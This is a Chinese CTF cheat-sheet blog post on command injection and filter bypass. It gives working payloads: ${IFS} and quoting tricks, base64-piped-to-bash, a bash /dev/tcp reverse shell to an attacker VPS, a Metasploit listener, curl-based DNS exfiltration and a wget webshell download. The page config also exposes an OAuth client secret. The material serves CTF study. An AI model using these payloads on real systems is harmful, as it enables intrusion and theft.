@@ -1,0 +1,150 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="命令执行及绕过"><meta name="keywords" content="ctf,命令执行"><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>命令执行及绕过【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
+});
+</script><script>var isPassword = '' || false;
+if (isPassword) {
+    if (prompt('请输入文章密码') !== '') {
+        alert('密码错误！');
+        history.back();
+    }
+}</script><script>window.GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
+}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01命令分隔符"><span class="toc-number">1.</span> <span class="toc-text">0x01命令分隔符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-绕过escapeshellcmd"><span class="toc-number">2.</span> <span class="toc-text">0x02 绕过escapeshellcmd</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#法一：win下执行bat"><span class="toc-number">2.1.</span> <span class="toc-text">法一：win下执行bat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#法二：宽字节注入"><span class="toc-number">2.2.</span> <span class="toc-text">法二：宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-空格过滤"><span class="toc-number">3.</span> <span class="toc-text">0x03 空格过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#法一：-IFS"><span class="toc-number">3.1.</span> <span class="toc-text">法一： ${IFS}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#法二：-重定向符-lt-gt"><span class="toc-number">3.2.</span> <span class="toc-text">法二： 重定向符&lt;&gt;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-黑名单绕过"><span class="toc-number">4.</span> <span class="toc-text">0x04 黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#法一：-拼接"><span class="toc-number">4.1.</span> <span class="toc-text">法一： 拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#法二：-利用已存在的资源"><span class="toc-number">4.2.</span> <span class="toc-text">法二： 利用已存在的资源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#法三：-base64编码"><span class="toc-number">4.3.</span> <span class="toc-text">法三： base64编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#法四：-单引号、双引号"><span class="toc-number">4.4.</span> <span class="toc-text">法四： 单引号、双引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#法五：反斜线"><span class="toc-number">4.5.</span> <span class="toc-text">法五：反斜线 \</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-无回显"><span class="toc-number">5.</span> <span class="toc-text">0x05 无回显</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-长度限制"><span class="toc-number">6.</span> <span class="toc-text">0x05 长度限制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x6长度限制"><span class="toc-number">7.</span> <span class="toc-text">0x6长度限制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-LINUX下一些已有字符"><span class="toc-number">8.</span> <span class="toc-text">0x07 LINUX下一些已有字符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-工具"><span class="toc-number">9.</span> <span class="toc-text">0x08 工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例题"><span class="toc-number">10.</span> <span class="toc-text">例题</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color4"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color2"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">173</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">151</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">命令执行及绕过</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-07-06 | 更新于 2020-07-06</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/ctf/">ctf</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/ctf/">ctf</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></div></div></div><div class="main-content"><p>详情可看如下两篇<br><a href="https://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a><br><a href="https://github.com/CHYbeta/WAF-Bypass/blob/master/ming-ling-zhu-ru/rao-guo-fang-fa.md" target="_blank" rel="noopener">命令执行的一些绕过技巧</a>    </p>
+<a id="more"></a>
+<h1 id="0x01命令分隔符"><a href="#0x01命令分隔符" class="headerlink" title="0x01命令分隔符"></a>0x01命令分隔符</h1><ol>
+<li>%0a符号   换行符   </li>
+<li>%0d符号  回车符  </li>
+<li>;符号 在 shell 中，担任”连续指令”功能的符号就是”分号”   </li>
+<li>&amp;符号  &amp; 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。进程切换到后台的时候，我们把它称为job。切换到后台时会输出相关job信息   </li>
+<li>|符号 管道符左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示   </li>
+<li>&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令  </li>
+<li>|| 表示上一条命令执行失败后，才执行下一条命令</li>
+<li>命令终止符  %00%20#</li>
+</ol>
+<h1 id="0x02-绕过escapeshellcmd"><a href="#0x02-绕过escapeshellcmd" class="headerlink" title="0x02 绕过escapeshellcmd"></a>0x02 绕过escapeshellcmd</h1><p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\）会在以下字符之前插入： &amp;#;|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。      </p>
+<p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于   </p>
+<h2 id="法一：win下执行bat"><a href="#法一：win下执行bat" class="headerlink" title="法一：win下执行bat"></a>法一：win下执行bat</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line">var_dump($escaped_command);</span><br><span class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</span><br><span class="line">system(<span class="string">'out.bat'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir&#x3D;..&#x2F; %1a whoami</span><br></pre></td></tr></table></figure>
+<h2 id="法二：宽字节注入"><a href="#法二：宽字节注入" class="headerlink" title="法二：宽字节注入"></a>法二：宽字节注入</h2><p>php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;);</span><br></pre></td></tr></table></figure>
+<p>之后该语句会变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 繺;id</span><br></pre></td></tr></table></figure>
+<p>从而实现 id 命令的注入。</p>
+<h1 id="0x03-空格过滤"><a href="#0x03-空格过滤" class="headerlink" title="0x03 空格过滤"></a>0x03 空格过滤</h1><h2 id="法一：-IFS"><a href="#法一：-IFS" class="headerlink" title="法一： ${IFS}"></a>法一： ${IFS}</h2><p>$IFS在linux下表示分隔符，然而我本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。   </p>
+<p>payload1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat flag</span><br><span class="line">nice day</span><br><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;flag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<p>payload2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;$9flag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<p>payload3:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<h2 id="法二：-重定向符-lt-gt"><a href="#法二：-重定向符-lt-gt" class="headerlink" title="法二： 重定向符&lt;&gt;"></a>法二： 重定向符&lt;&gt;</h2><p>payload1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat&lt;&gt;flag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<p>payload2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat&lt;flag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-黑名单绕过"><a href="#0x04-黑名单绕过" class="headerlink" title="0x04 黑名单绕过"></a>0x04 黑名单绕过</h1><h2 id="法一：-拼接"><a href="#法一：-拼接" class="headerlink" title="法一： 拼接"></a>法一： 拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ a&#x3D;c;b&#x3D;at;c&#x3D;flag;$a$b $c</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<h2 id="法二：-利用已存在的资源"><a href="#法二：-利用已存在的资源" class="headerlink" title="法二： 利用已存在的资源"></a>法二： 利用已存在的资源</h2><p>从已有的文件或者环境变量中获得相应的字符。</p>
+<h2 id="法三：-base64编码"><a href="#法三：-base64编码" class="headerlink" title="法三： base64编码"></a>法三： base64编码</h2><p>payload1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ &#96;echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d&#96;</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<p>payload2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bash</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<h2 id="法四：-单引号、双引号"><a href="#法四：-单引号、双引号" class="headerlink" title="法四： 单引号、双引号"></a>法四： 单引号、双引号</h2><p>payload1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at flag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<p>payload2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&quot;&quot;ag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<p>payload3:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&#39;&#39;ag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+<h2 id="法五：反斜线"><a href="#法五：反斜线" class="headerlink" title="法五：反斜线 \"></a>法五：反斜线 \</h2><p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ c\at fl\ag</span><br><span class="line">nice day</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05-无回显"><a href="#0x05-无回显" class="headerlink" title="0x05 无回显"></a>0x05 无回显</h1><p><strong>第一种是利用bash命令并在本地进行nc监听结果查看回连日志</strong><br>先在vps处用nc进行监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br></pre></td></tr></table></figure>
+<p>然后在靶机命令执行处输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><strong>第二种是msf反向回连</strong>  </p>
+<p>同样vps用msf监听</p>
+<p>vps的msf监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/armle/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport 8080</span><br><span class="line"><span class="built_in">set</span> lhost xxx.xxx.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p>然后在靶机命令执行处输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxxxxI(你的vps的公网ip)&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><strong>第三种是利用DNS管道解析</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|curl `whoami`.xxxx.xxx(子域名)</span><br></pre></td></tr></table></figure>
+<p>`反引号在linux下是执行命令的特殊符号</p>
+<h1 id="0x05-长度限制"><a href="#0x05-长度限制" class="headerlink" title="0x05 长度限制"></a>0x05 长度限制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[test])&lt;<span class="number">8</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($_GET[test]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x6长度限制"><a href="#0x6长度限制" class="headerlink" title="0x6长度限制"></a>0x6长度限制</h1><p><strong>文件构造</strong>  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[test])&lt;<span class="number">8</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($_GET[test]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&gt;wget\</span><br><span class="line">1&gt;域名.\</span><br><span class="line">1&gt;com\</span><br><span class="line">1&gt;-O\</span><br><span class="line">1&gt;she\</span><br><span class="line">1&gt;ll.p\</span><br><span class="line">1&gt;p</span><br><span class="line">ls&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+<p>将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。.<br>这里注意.不能作为文件名的开头，因为linux下.是隐藏文件的开头，ls列不出来</p>
+<p>然而这里还有个问题，就是ls下的文件名是按照字母顺序排序的，所以需要基于时间排序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -t&gt;a</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x07-LINUX下一些已有字符"><a href="#0x07-LINUX下一些已有字符" class="headerlink" title="0x07 LINUX下一些已有字符"></a>0x07 LINUX下一些已有字符</h1><ul>
+<li>${PS2} 对应字符 ‘&gt;’</li>
+<li>${PS4} 对应字符 ‘+’</li>
+<li>${IFS} 对应 内部字段分隔符</li>
+<li>${9} 对应 空字符串</li>
+</ul>
+<h1 id="0x08-工具"><a href="#0x08-工具" class="headerlink" title="0x08 工具"></a>0x08 工具</h1><ul>
+<li><a href="https://github.com/ewilded/shelling" target="_blank" rel="noopener">shelling
+</a></li>
+</ul>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><strong>GCTF RCE</strong><br>这题过滤了很多东西,下面说一下比较重要的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||&amp;|;|%&#123;&#125;| |<span class="string">''</span>|.|</span><br></pre></td></tr></table></figure>
+<p>这里给个payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%0acat%09</span><br><span class="line">%0Acat<span class="variable">$IFS</span><span class="variable">$9</span></span><br><span class="line">%0acat&lt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<p>参考文章:<br><a href="https://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a><br><a href="https://github.com/CHYbeta/WAF-Bypass/blob/master/ming-ling-zhu-ru/rao-guo-fang-fa.md" target="_blank" rel="noopener">命令执行的一些绕过技巧</a>  </p>
+</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/e6a569f4.html">https://blog.cfyqy.com/article/e6a569f4.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
+let title = arr[arr.length - 1];
+if (title === '') {
+    title = arr[arr.length - 2]
+}
+var flag = false;
+var gitFun = function () {
+    try {
+        var gitmentObj = window.GLOBAL_CONFIG.gitment;
+        var gitment = new Gitment({
+            id: decodeURI(title), // 可选。默认为 location.href
+            owner: gitmentObj.owner,
+            repo: gitmentObj.repo,
+            oauth: {
+                client_id: gitmentObj.client_id,
+                client_secret: gitmentObj.client_secret
+            },
+        });
+        gitment.render('comments-container');
+        flag = true;
+    } catch (e) {
+        flag = false;
+    }
+}
+var setIn = setInterval(() => {
+    if (!flag) {
+        gitFun();
+    } else {
+        clearInterval(setIn);
+    }
+}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/b55137d6.html"><i class="fas fa-angle-left">&nbsp;</i><span>python的沙箱逃匿</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/a0676cde.html"><span>CODEBREAKING_writeup</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>
